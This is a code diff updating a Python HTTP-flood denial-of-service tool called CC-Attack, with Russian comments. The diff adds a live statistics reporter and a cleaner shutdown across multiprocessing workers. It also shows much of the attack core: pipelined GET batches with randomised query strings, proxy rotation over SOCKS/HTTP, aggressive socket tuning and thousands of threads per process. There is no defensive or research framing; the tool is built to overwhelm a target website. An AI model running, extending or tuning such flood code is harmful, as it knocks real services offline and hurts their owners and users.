@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 """
-CC-Attack v5.0.0 — High-Performance Edition (Multiprocessing + Fast-path)
+CC-Attack v5.0.1 — High-Performance Edition + live stats reporter
 Author: DIDO
 Requires: pip install requests pysocks
 """
@@ -72,24 +72,24 @@ class C:
         YEL = GRN = CYN = BLU = PRP = WHT = ""
 
 
-VERSION = "5.0.0"
+VERSION = "5.0.1"
 BUILD   = "2026/09/26"
 
 # ── High-Performance tuning ─────────────────────────────────────────────────
-PIPELINE_DEPTH        = 64         # было 8, теперь 64
-KEEPALIVE_PER_SOCKET  = 10000      # было 500, теперь 10000
-SOCKET_SNDBUF         = 4194304    # 4 MB (было 256 KB)
-SOCKET_RCVBUF         = 4194304    # 4 MB
+PIPELINE_DEPTH        = 64
+KEEPALIVE_PER_SOCKET  = 10000
+SOCKET_SNDBUF         = 4194304
+SOCKET_RCVBUF         = 4194304
 CONNECT_TIMEOUT       = 2.5
 SEND_TIMEOUT          = 2.0
-ERROR_BACKOFF         = 0.001      # уменьшено с 0.002
-SEND_CHUNK            = 65536      # 64 KB за раз
+ERROR_BACKOFF         = 0.001
+SEND_CHUNK            = 65536
 
-TOP_ALIVE_DEFAULT     = 2000       # больше прокси — меньше нагрузка на каждый
+TOP_ALIVE_DEFAULT     = 2000
+
 
 # ── Fast RNG (без GIL-конкуренции) ──────────────────────────────────────────
 class FastRNG:
-    """Предвычисленный пул случайных чисел, чтобы убрать GIL-локи."""
     __slots__ = ("_pool", "_idx", "_size")
 
     def __init__(self, size: int = 8192):
@@ -103,7 +103,7 @@ class FastRNG:
         return self._pool[i]
 
 
-# ── Async logger (убирает datetime.now() из горячего пути) ─────────────────
+# ── Async logger ────────────────────────────────────────────────────────────
 class AsyncLog:
     _queue: "queue.Queue[str]" = queue.Queue(maxsize=100000)
     _thread: threading.Thread | None = None
@@ -240,25 +240,6 @@ def get_ua() -> str:
     return random.choice(_UA_CACHE)
 
 
-# ── Fast header builders (минимум байт в горячем пути) ─────────────────────
-def build_fast_get(host: str, path: str, rnd: int, ua: str) -> bytes:
-    """Минимальный GET — ~120 байт вместо ~700."""
-    return (f"GET {path}?{rnd} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"UA: {ua[:20]}\r\n"
-            f"Connection: Keep-Alive\r\n\r\n").encode()
-
-
-def build_fast_post(host: str, path: str, rnd: int, ua: str) -> bytes:
-    body = os.urandom(8).hex()
-    return (f"POST {path} HTTP/1.1\r\n"
-            f"Host: {host}\r\n"
-            f"UA: {ua[:20]}\r\n"
-            f"Content-Type: text/plain\r\n"
-            f"Content-Length: {len(body)}\r\n"
-            f"Connection: Keep-Alive\r\n\r\n{body}").encode()
-
-
 # ─────────────────────────────────────────────────────────────────────────────
 #  ЯДРО АТАКИ (оптимизированное)
 # ─────────────────────────────────────────────────────────────────────────────
@@ -268,7 +249,6 @@ class CCHandler:
         "stop", "pipeline_depth", "keepalive", "rng", "ua_cache",
         "stats_sent", "stats_errors", "stats_bytes",
         "_stat_lock", "_rr", "_rr_lock",
-        "fast_get_prefix", "fast_post_prefix", "host_bytes",
     )
 
     def __init__(self, target, path, port, protocol, proxies, proxy_type,
@@ -286,44 +266,22 @@ class CCHandler:
         self.pipeline_depth = max(1, min(128, pipeline_depth))
         self.keepalive = max(1, min(100000, keepalive))
 
-        # Fast RNG
         self.rng = FastRNG(size=8192)
-
-        # Предвычисленные UA
         self.ua_cache = [get_ua() for _ in range(64)]
 
-        # Хосты в байтах — не тратим время на encode
-        self.host_bytes = target.encode()
-
-        # Статистика через отдельные счётчики (без dict lookup)
         self.stats_sent = 0
         self.stats_errors = 0
         self.stats_bytes = 0
         self._stat_lock = threading.Lock()
 
-        # Round-robin
         self._rr = random.randint(0, max(0, len(proxies) - 1))
         self._rr_lock = threading.Lock()
 
-        # Предвычисленные префиксы для GET/POST (без случайного числа)
-        self.fast_get_prefix = (
-            f"GET {path}?".encode()
-        )
-        self.fast_post_prefix = (
-            f"POST {path} HTTP/1.1\r\n"
-            f"Host: {target}\r\n"
-            f"Content-Type: text/plain\r\n"
-            f"Content-Length: 16\r\n"
-            f"Connection: Keep-Alive\r\n\r\n"
-        ).encode()
-
-    # ── статистика: быстрый инкремент без лока ─────────────────────────
     def _stat(self, sent=0, err=0, nbytes=0):
         self.stats_sent += sent
         self.stats_errors += err
         self.stats_bytes += nbytes
 
-    # ── выбор прокси ───────────────────────────────────────────────────
     def _pick_proxy(self):
         n = len(self.proxies)
         for _ in range(min(20, n)):
@@ -341,7 +299,6 @@ class CCHandler:
                 return host, port
         raise ValueError("no valid proxy")
 
-    # ── открытие сокета ────────────────────────────────────────────────
     def _open(self, host, port):
         s = socks.socksocket()
 
@@ -352,7 +309,6 @@ class CCHandler:
         else:
             s.set_proxy(socks.HTTP, host, port)
 
-        # TCP-твики для плавности и скорости
         try:
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCKET_SNDBUF)
@@ -380,30 +336,26 @@ class CCHandler:
             pass
         return s
 
-    # ── построение пачки запросов (fast-path) ──────────────────────────
     def _build_batch(self, n: int) -> bytes:
-        """
-        Минимальные GET-запросы одной пачкой.
-        Используем предвычисленный префикс + fast RNG.
-        """
         rng = self.rng
         uas = self.ua_cache
         ua_len = len(uas)
+        target = self.target
+        path = self.path
 
         parts = []
         append = parts.append
-        for i in range(n):
+        for _ in range(n):
             rnd = rng.next()
             ua = uas[rnd % ua_len]
             append(
-                f"GET {self.path}?{rnd} HTTP/1.1\r\n"
-                f"Host: {self.target}\r\n"
+                f"GET {path}?{rnd} HTTP/1.1\r\n"
+                f"Host: {target}\r\n"
                 f"UA: {ua[:20]}\r\n"
                 f"Connection: Keep-Alive\r\n\r\n"
             )
         return "".join(parts).encode()
 
-    # ── отправка пачки (chunked sendall) ───────────────────────────────
     def _send_batch(self, s, batch: bytes) -> bool:
         try:
             CHUNK = SEND_CHUNK
@@ -418,7 +370,6 @@ class CCHandler:
                 ConnectionResetError, OSError):
             return False
 
-    # ── attack: pipeline burst ─────────────────────────────────────────
     def _attack_pipeline(self, s):
         depth = self.pipeline_depth
         ka = self.keepalive
@@ -430,7 +381,6 @@ class CCHandler:
             sent += depth
             self._stat(sent=depth, nbytes=len(batch))
 
-    # ── основной цикл ──────────────────────────────────────────────────
     def run(self):
         stop = self.stop
         while not stop.is_set():
@@ -457,12 +407,14 @@ class CCHandler:
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  WORKER для multiprocessing
+#  WORKER для multiprocessing (+ поток-репортёр)
 # ─────────────────────────────────────────────────────────────────────────────
 def _proc_worker(cfg: dict, proxies: list[str],
-                 thread_count: int, period: int, result_q):
+                 thread_count: int, period: int,
+                 result_q, stop_flag):
     """
     Процесс-воркер. Запускает thread_count потоков в своём GIL.
+    Каждую секунду отправляет счётчики в главный процесс.
     """
     stop_event = threading.Event()
 
@@ -481,22 +433,54 @@ def _proc_worker(cfg: dict, proxies: list[str],
         t.start()
         threads.append(t)
 
-    # Работаем period секунд
+    # ── 🆕 Фоновый поток-репортёр: шлёт статистику каждую секунду ──────
+    stop_reporter = threading.Event()
+
+    def reporter():
+        last_sent = 0
+        last_err = 0
+        last_bytes = 0
+        while not stop_reporter.is_set():
+            time.sleep(1.0)
+            cur_sent = handler.stats_sent
+            cur_err = handler.stats_errors
+            cur_bytes = handler.stats_bytes
+            delta_sent = cur_sent - last_sent
+            delta_err = cur_err - last_err
+            delta_bytes = cur_bytes - last_bytes
+            last_sent = cur_sent
+            last_err = cur_err
+            last_bytes = cur_bytes
+            try:
+                result_q.put_nowait(
+                    (delta_sent, delta_err, delta_bytes,
+                     cur_sent, cur_err, cur_bytes)
+                )
+            except Exception:
+                pass
+
+    reporter_thread = threading.Thread(target=reporter, daemon=True)
+    reporter_thread.start()
+
     start = time.time()
     try:
         while time.time() - start < period and not stop_event.is_set():
+            if stop_flag is not None and stop_flag.value:
+                break
             time.sleep(0.5)
     except KeyboardInterrupt:
         pass
     finally:
+        # Финальный репорт перед выходом
+        try:
+            result_q.put_nowait(
+                (0, 0, 0,
+                 handler.stats_sent, handler.stats_errors, handler.stats_bytes)
+            )
+        except Exception:
+            pass
         stop_event.set()
-
-    # Отправляем статистику обратно
-    try:
-        result_q.put((handler.stats_sent, handler.stats_errors,
-                      handler.stats_bytes))
-    except Exception:
-        pass
+        stop_reporter.set()
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -724,7 +708,7 @@ def check_proxies(proxies, proxy_type, ms=3, workers=800,
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  RUN_ATTACK (multiprocessing версия)
+#  RUN_ATTACK (multiprocessing + live stats)
 # ─────────────────────────────────────────────────────────────────────────────
 def run_attack(cfg):
     url = cfg["url"]
@@ -787,6 +771,8 @@ def run_attack(cfg):
     }
 
     result_q = mp.Queue()
+    stop_flag = mp.Value("b", 0)
+
     processes = []
 
     try:
@@ -794,7 +780,7 @@ def run_attack(cfg):
             p = mp.Process(
                 target=_proc_worker,
                 args=(proc_cfg, proxies, cfg["threads"],
-                      cfg["period"], result_q),
+                      cfg["period"], result_q, stop_flag),
                 daemon=False,
             )
             p.start()
@@ -816,13 +802,15 @@ def run_attack(cfg):
             time.sleep(1)
             elapsed = max(1e-6, time.time() - start)
 
-            # Собираем статистику из очереди (если процессы уже отправили)
+            # 🆕 Собираем ЛЮБЫЕ доступные пакеты из очереди (live)
+            got_any = False
             while True:
                 try:
-                    s, e, b = result_q.get_nowait()
-                    sent_total += s
-                    errors_total += e
-                    bytes_total += b
+                    ds, de, db, ts, te, tb = result_q.get_nowait()
+                    sent_total += ds
+                    errors_total += de
+                    bytes_total += db
+                    got_any = True
                 except queue.Empty:
                     break
 
@@ -842,21 +830,31 @@ def run_attack(cfg):
     except KeyboardInterrupt:
         Log.warn("Interrupt — stopping…")
     finally:
-        # Останавливаем все процессы
+        stop_flag.value = 1
+
+        # Дать процессам завершиться корректно
+        deadline = time.time() + 2.0
+        for p in processes:
+            remain = max(0.1, deadline - time.time())
+            p.join(timeout=remain)
+
+        # Добить живые
         for p in processes:
             if p.is_alive():
                 p.terminate()
         for p in processes:
-            p.join(timeout=2)
+            if p.is_alive():
+                p.join(timeout=1)
+
         print()
 
-        # Финальная статистика
+        # Финальный сбор всей очереди
         while True:
             try:
-                s, e, b = result_q.get_nowait()
-                sent_total += s
-                errors_total += e
-                bytes_total += b
+                ds, de, db, ts, te, tb = result_q.get_nowait()
+                sent_total += ds
+                errors_total += de
+                bytes_total += db
             except queue.Empty:
                 break
 
@@ -909,7 +907,6 @@ def interactive_cli():
                   cast=lambda x: x.lower())
     down = ans in ("y", "yes", "д", "да", "")
 
-    # threads per process
     default_t = max(100, 2000 // max(1, mp.cpu_count()))
     threads = _prompt(f"Threads per process (CPU×{mp.cpu_count()})",
                       default=default_t, cast=int,
@@ -1031,7 +1028,7 @@ def main() -> int:
 
 if __name__ == "__main__":
     try:
-        mp.freeze_support()  # Windows fix for multiprocessing
+        mp.freeze_support()
         sys.exit(main())
     except KeyboardInterrupt:
         print("\nInterrupted by user.")
